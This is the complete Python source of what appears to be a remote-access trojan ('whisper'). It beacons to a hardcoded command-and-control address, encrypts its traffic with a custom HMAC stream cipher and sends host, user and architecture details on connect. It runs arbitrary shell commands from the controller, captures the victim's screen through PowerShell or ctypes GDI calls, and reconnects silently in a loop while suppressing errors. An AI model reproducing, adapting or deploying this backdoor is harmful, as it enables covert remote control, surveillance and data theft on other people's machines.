import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform

C2_HOST = '127.0.0.1'
C2_PORT = 4449
ENCRYPTION_PASSWORD = 'whisper_secret_key'
RECONNECT_DELAY = 1

def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
def _eb(p, k):
    iv = os.urandom(16); ks, c = b"", 0
    while len(ks) < len(p):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    ct = bytes(x ^ y for x, y in zip(p, ks))
    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
def _db(d, k):
    iv, tag, ct = d[:16], d[16:32], d[32:]
    if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
    ks, c = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    return bytes(x ^ y for x, y in zip(ct, ks))
def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
def rms(s):
    r = s.recv(4)
    if not r: return None
    sz = int.from_bytes(r, "big"); d = b""
    while len(d) < sz:
        c = s.recv(sz - len(d))
        if not c: return None
        d += c
    return dec(d)
def sms(s, d):
    p = enc(d); s.sendall(len(p).to_bytes(4, "big") + p)

_CMDS = {}

# --- screenshot plugin ---

def _cmd_screenshot(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] Screenshot requires Windows"}
        import subprocess, base64, io
        ps = '''
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class SS {
    [DllImport("gdi32.dll")] static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);
    [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);
    [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);
    [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdc, int x, int y, int w, int h, IntPtr hdcSrc, int x1, int y1, uint rop);
    [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);
    [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] static extern IntPtr GetWindowDC(IntPtr hwnd);
    [DllImport("user32.dll")] static extern bool ReleaseDC(IntPtr hwnd, IntPtr hdc);
    public static byte[] Capture(int w, int h) {
        IntPtr hdcSrc = GetDC(GetDesktopWindow());
        IntPtr hdcDst = CreateCompatibleDC(hdcSrc);
        IntPtr hbmp = CreateCompatibleBitmap(hdcSrc, w, h);
        SelectObject(hdcDst, hbmp);
        BitBlt(hdcDst, 0, 0, w, h, hdcSrc, 0, 0, 0x00CC0020);
        var bmp = new System.Drawing.Bitmap(w, h, w*4, System.Drawing.Imaging.PixelFormat.Format32bppRgb, hbmp);
        var ms = new System.IO.MemoryStream();
        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
        DeleteDC(hdcDst); DeleteObject(hbmp); ReleaseDC(GetDesktopWindow(), hdcSrc);
        return ms.ToArray();
    }
}
"@
$w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
[Convert]::ToBase64String([SS]::Capture($w, $h))
'''
        r = subprocess.run(["powershell","-NoP","-NonI","-Command",ps], capture_output=True, text=True, timeout=30)
        if r.returncode == 0 and r.stdout.strip():
            return {"data": r.stdout.strip()}
        raise Exception(r.stderr[:200] if r.stderr else "PS capture failed")
    except Exception as e:
        try:
            import ctypes
            w = ctypes.windll.user32.GetSystemMetrics(0)
            h = ctypes.windll.user32.GetSystemMetrics(1)
            hdc_src = ctypes.windll.user32.GetDC(None)
            hdc_dst = ctypes.windll.gdi32.CreateCompatibleDC(hdc_src)
            hbmp = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_src, w, h)
            ctypes.windll.gdi32.SelectObject(hdc_dst, hbmp)
            ctypes.windll.gdi32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
            sz = w * h * 4
            bits = (ctypes.c_byte * sz)()
            class BIH(ctypes.Structure): _fields_ = [("s", ctypes.c_uint32),("w", ctypes.c_int32),("h", ctypes.c_int32),("p", ctypes.c_uint16),("b", ctypes.c_uint16),("c", ctypes.c_uint32),("s2", ctypes.c_uint32),("x", ctypes.c_int32),("y", ctypes.c_int32),("u", ctypes.c_uint32),("v", ctypes.c_uint32)]
            bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
            ctypes.windll.gdi32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
            ctypes.windll.user32.ReleaseDC(None, hdc_src); ctypes.windll.gdi32.DeleteDC(hdc_dst); ctypes.windll.gdi32.DeleteObject(hbmp)
            import struct
            data = struct.pack("<HIHHI", 0x4D42, 54+sz, 0, 0, 54) + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
            return {"data": base64.b64encode(data).decode()}
        except Exception as e2:
            return {"output": f"[!] Screenshot failed: {e2}"}
_CMDS["screenshot"] = _cmd_screenshot


# --- shell plugin ---

def _cmd_shell(m):
    try:
        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
        return {"output": (r.stdout + r.stderr) or "(no output)"}
    except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
    except Exception as e: return {"output": f"[!] {e}"}
_CMDS["shell"] = _cmd_shell

_CMDS['screenshot'] = _cmd_screenshot
_CMDS['shell'] = _cmd_shell

def _cmd_info(m):
    return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
_CMDS["info"] = _cmd_info

def _main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30); s.connect((C2_HOST, C2_PORT))
            sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
            s.settimeout(15)
            while True:
                try:
                    m = rms(s)
                    if m is None: break
                except socket.timeout:
                    sms(s, {"type":"ping"}); continue
                if m["type"] == "exit": s.close(); return
                fn = _CMDS.get(m["type"])
                if fn:
                    try:
                        r = fn(m)
                        if r is not None: sms(s, {"type":"response",**r})
                    except Exception as e: sms(s, {"type":"response","error":str(e)})
                else:
                    sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    _main()
